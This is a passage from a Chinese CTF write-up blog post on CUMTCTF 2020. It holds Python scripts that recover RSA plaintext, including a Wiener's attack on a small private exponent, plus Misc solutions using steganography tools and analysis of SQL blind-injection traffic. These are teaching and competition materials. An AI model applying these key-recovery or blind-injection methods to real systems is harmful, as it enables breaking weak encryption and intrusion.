给了p-q。<br>所以 <code>(p+q)^2=(p-q)^2+4pq</code>即可求得p+q。</p>
+<pre><code>import gmpy2
+import libnum
+n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
+x1=-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
+e=65537
+c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
+x2=x1**2+4*n
+x3=gmpy2.iroot(x2,2)
+x3=58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078
+phi=n-x3+1
+d=gmpy2.invert(e,phi)
+m=pow(c,d,n)
+print(libnum.n2s(m))</code></pre><h2 id="维也纳的秘密"><a href="#维也纳的秘密" class="headerlink" title="维也纳的秘密"></a>维也纳的秘密</h2><pre><code>import random, MillerRabin, Arithmetic
+from Crypto.Util.number import *
+from Secret import flag
+def getPrimePair(bits=1024):
+assert bits%4==0
+p = MillerRabin.gen_prime(bits)
+q = MillerRabin.gen_prime_range(p+1, 2*p)
+return p,q
+
+
+def generateKeys(nbits=2048):
+assert nbits%4==0
+p,q = getPrimePair(nbits//2)
+n = p*q
+phi = Arithmetic.totient(p, q)
+good_d = False
+while not good_d:
+    d = random.getrandbits(nbits//4)
+    if (Arithmetic.gcd(d,phi) == 1 and 36*pow(d,4) &lt; n):
+        good_d = True
+e = Arithmetic.modInverse(d,phi)
+return e,n,d
+
+m = bytes_to_long(flag)
+e,n,d = generateKeys()
+
+print(e,n)
+c = pow (m,e,n)
+print (c)
+# 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193,106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
+# 15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160</code></pre><p>一看题目发现e和n都很大，再根据题目名字，知道这是wiener’s attack.</p>
+<pre><code>import gmpy2
+import libnum
+def transform(x,y):   #使用辗转相处将分数 x/y 转为连分数的形式
+res=[]
+while y:
+    res.append(x//y)
+    x,y=y,x%y
+return res
+
+def continued_fraction(sub_res):
+numerator,denominator=1,0
+for i in sub_res[::-1]:      #从sublist的后面往前循环
+    denominator,numerator=numerator,i*numerator+denominator
+return denominator,numerator   #得到渐进分数的分母和分子，并返回
+
+
+#求解每个渐进分数
+def sub_fraction(x,y):
+res=transform(x,y)
+res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数
+return res
+
+
+def get_pq(a,b,c):  #由p+q和pq的值通过维达定理来求解p和q
+par=gmpy2.isqrt(b*b-4*a*c)   #由上述可得，开根号一定是整数，因为有解
+x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)
+return x1,x2
+
+
+def wienerAttack(e,n):
+for (d,k) in sub_fraction(e,n):  #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
+    if k==0:                     #可能会出现连分数的第一个为0的情况，排除
+        continue
+    if (e*d-1)%k!=0:             #ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
+        continue
+
+    phi=(e*d-1)//k               #这个结果就是 φ(n)
+    px,qy=get_pq(1,n-phi+1,n)
+    if px*qy==n:
+        p,q=abs(int(px)),abs(int(qy))     #可能会得到两个负数，负负得正未尝不会出现
+        d=gmpy2.invert(e,(p-1)*(q-1))     #求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
+        return d
+print(&quot;该方法不适用&quot;)
+
+
+e = 25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193
+n = 106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
+d=wienerAttack(e,n)
+c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160
+m=pow(c,d,n)
+print(libnum.n2s(m))</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="真·签到题"><a href="#真·签到题" class="headerlink" title="真·签到题"></a>真·签到题</h2><p>用vim打开在文件末尾发现<code>RVdPVkVWSHtVMWlwX2twX3V3ZWVndXVodzExYSF9IA==</code><br>base64编码。<br>解码得到 <code>EWOVEVH{U1ip_kp_uweeguuhw11a!}</code> 发现是凯撒密码，向前移动两位得到flag。</p>
+<h2 id="能看到我吗"><a href="#能看到我吗" class="headerlink" title="能看到我吗"></a>能看到我吗</h2><p>经过爆破，得到压缩包密码是 <code>1433223233</code>，解压得到一张名为twins.png的图片。用binwalk分析发现里面有两个PNG图片。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gj36rgc8pdj30gc05nacv.jpg" alt=""><br>使用foremost命令分离。<br>两张图片的话我所知道的就是用stegsolve合并两张图片或者盲水印。<br>前一个没有明显特征，所以使用后面一个方法。</p>
+<pre><code>python3 bwmforpy3.py decode 00000000.png 00001333.png solve.png</code></pre><p>获得flag。</p>
+<p>参考：<a href="https://github.com/chishaxie/BlindWaterMark#blindwatermark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark#blindwatermark</a></p>
+<h2 id="兔兔那么可爱"><a href="#兔兔那么可爱" class="headerlink" title="兔兔那么可爱"></a>兔兔那么可爱</h2><p>先以为是rabbit密码没解出来。后面根据hint知道是斐波那契数列。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj378xe8qlj30sa028mxe.jpg" alt=""><br>根据数列以及flag文件中字符对应字母的位置，可以获得flag。</p>
+<pre><code>CUMTCTF{Are_rabbits_cute?}</code></pre><p>这题我是根据sublime text软件选取字符来来找的，也能使用脚本跑出flag。脚本自寻查找。</p>
+<h2 id="别做题了听歌吧"><a href="#别做题了听歌吧" class="headerlink" title="别做题了听歌吧"></a>别做题了听歌吧</h2><p>打开发现是一个mp3文件，而且题目说问就是cumt，想到是音频隐写利用mp3stego工具求解。</p>
+<pre><code>Decode.exe -X -P cumt anheqiao.mp3</code></pre><p>得到anheqiao.mp3.txt，打开发现全是空白，但是发现确实有内容，我以为和之前钓鱼城杯的那题一样是whitespace编码，但解出来发现都是乱码，使用sublime text打开发现都是.和——,所以想到摩斯电码，空格是.，tab是-，换行符是/，替换一下进行摩斯电码解密最后包上CUMTCTF{}获得flag。</p>
+<h2 id="大鲨鱼之你可劲找"><a href="#大鲨鱼之你可劲找" class="headerlink" title="大鲨鱼之你可劲找"></a>大鲨鱼之你可劲找</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gj37u7j8zfj316u0g7q5c.jpg" alt=""><br>发现都是盲注的语句，flag形式是CUMTCTF，于是寻找符合条件的盲注语句。<br>经过分析可知，当if为真时返回 <code>Hello,L1dng wants a girlfriend</code>，为假时返回 <code>You should be stronger</code>。<br>照这个思路寻找if为假时的最小值。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gj380b2uy0j314w058mxb.jpg" alt=""><br>第一个字符&gt;67时if为假，而且67是最小的，所以第一个字符的ASCII为67即C。</p>
+
+      <blockquote class="mdui-m-t-5">
+        
+        <strong>本文链接：</strong><a href="https://devildragons.github.io/2020/09/25/CUMTCTF2020/">https://devildragons.github.io/2020/09/25/CUMTCTF2020/</a>
+      </blockquote>
+      
+    </div>
+    <footer class="mdui-card-actions">
+      
+        <a class="mdui-ripple article_categories-link" href="/categories/web/">web</a>
+      
+      
+        <a class="mdui-ripple article_tags-link" href="/tags/cumt/" rel="tag">cumt</a>
+      
+    </footer>
+    
+  </article>
+  
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>
+
+
+  <nav id="paginator">
+    
+    <div class="spacer"></div>
+    
+      <a rel="next" class="extend next" href="/2020/07/07/CUMTOJ/">
+        下一篇&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
+      </a>
+    
+  </nav>
+
+
+
+
+<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC81MTU2OC8yODA0OQ==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 --></main>
+  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
+  <div class="mdui-p-y-0 mdui-text-center">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  </div>
+  <div class="mdui-p-y-1 mdui-text-center">
+    Copyright &copy; 2019 - 2020 灬魔龙<br>
+    Powered by <a href="https://hexo.io/" target="_blank" class="mdui-text-color-theme-accent">Hexo</a>
+    
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_site_pv">
+                本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv" style='display:none'>
+                本站访客数<span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+  </div>
+</footer>
+  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
+  
+  
+<script src="/js/mdui.js"></script>
+<script src="/js/script.js"></script>
+
+</body>
+</html>
